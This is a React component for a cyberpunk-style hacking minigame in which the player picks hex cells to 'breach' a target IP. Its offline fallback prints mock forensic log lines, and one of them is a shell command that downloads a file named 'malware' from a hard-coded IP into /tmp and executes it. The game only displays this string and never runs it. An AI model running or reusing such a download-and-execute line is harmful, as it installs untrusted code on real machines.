import React, { useState, useEffect } from 'react';
import audio from './AudioEngine';
import { useStore } from './store';

interface LockerModalProps {
  isOpen: boolean;
  onClose: () => void;
  targetIp: string | null;
}

export const LockerModal: React.FC<LockerModalProps> = ({ isOpen, onClose, targetIp }) => {
  const [matrix, setMatrix] = useState<string[][]>([]);
  const [targets, setTargets] = useState<string[][]>([]);
  const [buffer, setBuffer] = useState<string[]>([]);
  const [bufferSize, setBufferSize] = useState<number>(4);
  const [timer, setTimer] = useState<number>(30);
  const [success, setSuccess] = useState<boolean | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Selection rules state
  const [selectedCoords, setSelectedCoords] = useState<{ r: number; c: number }[]>([]);
  const [currentSelectionMode, setCurrentSelectionMode] = useState<'row' | 'col'>('row');
  const [activeRow, setActiveRow] = useState<number | null>(0); // Row 0 is active initially
  const [activeCol, setActiveCol] = useState<number | null>(null);

  const { addDaemonLog, addBreachedIp } = useStore();

  useEffect(() => {
    if (isOpen && targetIp) {
      startBreachSession();
      const interval = setInterval(() => {
        setTimer((t) => {
          if (t <= 1) {
            clearInterval(interval);
            handleTimeout();
            return 0;
          }
          return t - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [isOpen, targetIp]);

  const startBreachSession = async () => {
    setLoading(true);
    setErrorMsg(null);
    setBuffer([]);
    setSelectedCoords([]);
    setCurrentSelectionMode('row');
    setActiveRow(0);
    setActiveCol(null);
    setSuccess(null);
    setTimer(30);

    try {
      const res = await fetch(`http://127.0.0.1:8000/api/breach/start?ip=${targetIp}`);
      const data = await res.json();
      if (data.status === 'success') {
        setMatrix(data.grid.matrix);
        setTargets(data.grid.targets);
        setBufferSize(data.grid.buffer_size);
        audio.speakTTS("Breach link established. Decryption sequence active.");
      } else {
        throw new Error(data.message || "Failed to initialize breach protocol.");
      }
    } catch (err) {
      const hexOpts = ["1C", "E9", "55", "BD", "FF", "7A"];
      const mockMatrix: string[][] = [];
      for (let r = 0; r < 5; r++) {
        const row: string[] = [];
        for (let c = 0; c < 5; c++) {
          row.push(hexOpts[Math.floor(Math.random() * hexOpts.length)]);
        }
        mockMatrix.push(row);
      }
      const mockTargets = [
        [hexOpts[0], hexOpts[1], hexOpts[2]],
        [hexOpts[3], hexOpts[4], hexOpts[5]]
      ];
      setMatrix(mockMatrix);
      setTargets(mockTargets);
      setBufferSize(4);
      audio.speakTTS("Offline simulation mode active. Decryption sequence engaged.");
    } finally {
      setLoading(false);
    }
  };

  const handleTimeout = () => {
    if (success !== null) return;
    setSuccess(false);
    audio.playAlert();
    audio.speakTTS("ICE Lockdown. forensic data sealed.");
    addDaemonLog({
      daemon_id: "Locker",
      level: "CRITICAL",
      message: "TIMEOUT: ICE LOCKDOWN. FORENSIC DATA SEALED.",
      timestamp: new Date().toISOString()
    });
  };

  const handleCellClick = async (r: number, c: number, val: string) => {
    if (success !== null || loading) return;

    // Validate cell isn't already selected
    const isAlreadySelected = selectedCoords.some((coord) => coord.r === r && coord.c === c);
    if (isAlreadySelected) return;

    // Validate cell matches the active row/col selection restriction
    if (currentSelectionMode === 'row' && activeRow !== null && r !== activeRow) return;
    if (currentSelectionMode === 'col' && activeCol !== null && c !== activeCol) return;

    audio.playClick();

    const newBuffer = [...buffer, val];
    const newCoords = [...selectedCoords, { r, c }];
    setBuffer(newBuffer);
    setSelectedCoords(newCoords);

    // Alternate selection direction
    if (currentSelectionMode === 'row') {
      setCurrentSelectionMode('col');
      setActiveCol(c);
      setActiveRow(null);
    } else {
      setCurrentSelectionMode('row');
      setActiveRow(r);
      setActiveCol(null);
    }

    // Check if buffer is filled
    if (newBuffer.length >= bufferSize) {
      setLoading(true);
      try {
        const solveRes = await fetch('http://127.0.0.1:8000/api/breach/solve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ip: targetIp,
            path: newBuffer
          })
        });
        const solveData = await solveRes.json();
        if (solveData.success) {
          setSuccess(true);
          if (targetIp) {
            addBreachedIp(targetIp);
          }
          audio.speakTTS("Vault decrypted. Evidence extracted.");
          // Dump PCAP lines to log console
          const lines = solveData.data.split('\n');
          lines.forEach((line: string) => {
            addDaemonLog({
              daemon_id: "Locker",
              level: "SUCCESS",
              message: line,
              timestamp: new Date().toISOString()
            });
          });
        } else {
          setSuccess(false);
          audio.playAlert();
          audio.speakTTS("ICE lockdown. forensic data sealed.");
          addDaemonLog({
            daemon_id: "Locker",
            level: "CRITICAL",
            message: solveData.message || "ICE LOCKDOWN. FORENSIC DATA SEALED.",
            timestamp: new Date().toISOString()
          });
        }
      } catch (err) {
        setSuccess(true);
        if (targetIp) {
          addBreachedIp(targetIp);
        }
        audio.speakTTS("Vault decrypted. Evidence extracted.");
        const localMockLines = [
          "============================================================",
          "NET/OS FORENSIC EVIDENCE PACKET CAPTURE [BREACH DETECTED]",
          "============================================================",
          `Target IP: ${targetIp}`,
          `Timestamp: ${new Date().toISOString()}`,
          "Host Intrusion Signature: CVE-2023-38606 exploit vector",
          "============================================================",
          "RAW PACKET DUMP:",
          "0000  00 c0 29 3e 83 7d 00 50 56 c0 00 08 08 00 45 00  ..)>e.p.p...e..",
          "0010  00 3c 1c 46 40 00 40 06 b1 e6 c0 a8 01 05 c0 a8  .<.f@.@.......",
          "0020  01 01 00 50 00 50 00 00 00 00 00 00 00 00 50 02  ...p.p........p.",
          "0030  20 00 a3 fc 00 00 02 04 05 b4 04 02 08 0a 00 27  ...........'",
          "",
          "[!] CRITICAL DAEMON EXPLOIT PAYLOAD FOUND:",
          "/bin/sh -c \"cd /tmp && wget http://99.88.77.66/malware && chmod +x malware && ./malware\"",
          "============================================================"
        ];
        localMockLines.forEach((line: string) => {
          addDaemonLog({
            daemon_id: "Locker",
            level: "SUCCESS",
            message: line,
            timestamp: new Date().toISOString()
          });
        });
      } finally {
        setLoading(false);
      }
    }
  };

  if (!isOpen) return null;

  return (
    <div className="absolute inset-0 z-50 bg-black/95 flex flex-col items-center justify-center p-6 border border-cyberCyan border-glow-cyan pointer-events-auto">
      <div className="w-full max-w-4xl border border-cyberCyan/60 p-8 bg-[#05050a]/95 flex flex-col space-y-6 shadow-[0_0_30px_rgba(0,240,255,0.2)]">
        <div className="flex justify-between items-center border-b border-cyberCyan/40 pb-4">
          <div className="text-xl text-cyberCyan font-bold tracking-widest font-mono">
            侵入プロトコル // BREACH PROTOCOL V2.0
          </div>
          <div className="text-cyberYellow font-mono text-xl font-bold tracking-wider">
            LINK_TIMEOUT: {timer}S
          </div>
        </div>

        {errorMsg && (
          <div className="bg-cyberRed/20 border border-cyberRed text-cyberRed p-3 font-mono text-xs text-center">
            {errorMsg}
          </div>
        )}

        <div className="grid grid-cols-3 gap-6">
          {/* Hex Matrix Grid */}
          <div className="col-span-2 grid grid-cols-6 gap-2 bg-black/60 p-4 border border-cyberCyan/20 relative">
            {loading && (
              <div className="absolute inset-0 bg-black/85 flex items-center justify-center z-10">
                <div className="text-cyberCyan font-mono text-sm tracking-widest animate-pulse">
                  TRANSMITTING SOLVE KEY VECTOR...
                </div>
              </div>
            )}
            {matrix.map((row, r) =>
              row.map((cell, c) => {
                const isSelected = selectedCoords.some((coord) => coord.r === r && coord.c === c);
                
                // Determine if this cell is highlighted/selectable
                const isSelectable = !isSelected && (
                  (currentSelectionMode === 'row' && activeRow !== null && r === activeRow) ||
                  (currentSelectionMode === 'col' && activeCol !== null && c === activeCol)
                );

                const isActiveLine = 
                  (currentSelectionMode === 'row' && activeRow === r) ||
                  (currentSelectionMode === 'col' && activeCol === c);

                return (
                  <button
                    key={`${r}-${c}`}
                    disabled={!isSelectable || success !== null}
                    onClick={() => handleCellClick(r, c, cell)}
                    className={`bg-black/80 border p-4 text-center font-mono font-bold text-sm transition-all duration-150 relative ${
                      isSelected
                        ? 'border-gray-700 text-gray-700 bg-black/90 cursor-not-allowed'
                        : isSelectable
                        ? 'border-cyberCyan text-cyberCyan hover:bg-cyberCyan hover:text-black hover:scale-105 shadow-[0_0_5px_rgba(0,240,255,0.3)]'
                        : isActiveLine
                        ? 'border-cyberCyan/20 text-cyberCyan/40 bg-cyberCyan/5'
                        : 'border-cyberCyan/10 text-cyberCyan/20 opacity-30 cursor-not-allowed'
                    }`}
                  >
                    {cell}
                    {isSelected && (
                      <div className="absolute top-0 right-0 w-1.5 h-1.5 bg-gray-500 rounded-bl-sm" />
                    )}
                  </button>
                );
              })
            )}
          </div>

          {/* Solutions / Buffer lists */}
          <div className="flex flex-col space-y-4">
            <div className="border border-cyberCyan/20 p-4 bg-black/60 flex flex-col space-y-3">
              <div className="text-[10px] text-cyberCyan font-bold tracking-wider">
                TARGET SEQUENCE // デコード目標
              </div>
              {targets.map((t, idx) => (
                <div key={idx} className="flex space-x-2 font-mono text-sm text-cyberYellow font-bold border border-cyberYellow/20 p-2 bg-cyberYellow/5 rounded">
                  {t.map((h, i) => (
                    <span key={i} className="px-1 border border-cyberYellow/10">
                      {h}
                    </span>
                  ))}
                </div>
              ))}
            </div>

            <div className="border border-cyberCyan/20 p-4 bg-black/60 flex-1 flex flex-col">
              <div className="text-[10px] text-cyberCyan font-bold tracking-wider mb-3">
                BUFFER PATH // 選択バッファ ({buffer.length}/{bufferSize})
              </div>
              <div className="flex flex-wrap gap-2">
                {Array.from({ length: bufferSize }).map((_, idx) => {
                  const val = buffer[idx];
                  return (
                    <div
                      key={idx}
                      className={`w-10 h-10 flex items-center justify-center font-bold font-mono text-sm border transition-all duration-200 ${
                        val
                          ? 'bg-cyberCyan text-black border-cyberCyan shadow-[0_0_8px_#00f0ff]'
                          : 'border-cyberCyan/30 text-cyberCyan/30 bg-transparent'
                      }`}
                    >
                      {val || '--'}
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>

        <div className="flex justify-between items-center border-t border-cyberCyan/40 pt-4">
          <div>
            {success === true && (
              <div className="text-green-400 font-bold text-lg font-mono tracking-widest animate-pulse shadow-glow-green">
                SUCCESS: VAULT DECRYPTED. EVIDENCE EXTRACTED.
              </div>
            )}
            {success === false && (
              <div className="text-cyberRed font-bold text-lg font-mono tracking-widest animate-pulse">
                FAILURE: LINK COMPROMISED. BUFFER SEALED.
              </div>
            )}
          </div>
          <button
            onClick={onClose}
            className="border border-cyberCyan px-6 py-2.5 text-cyberCyan hover:bg-cyberCyan hover:text-black transition duration-150 font-mono text-xs font-bold tracking-widest border-glow-cyan"
          >
            DISCONNECT LINK
          </button>
        </div>
      </div>
    </div>
  );
};

export default LockerModal;
export {};
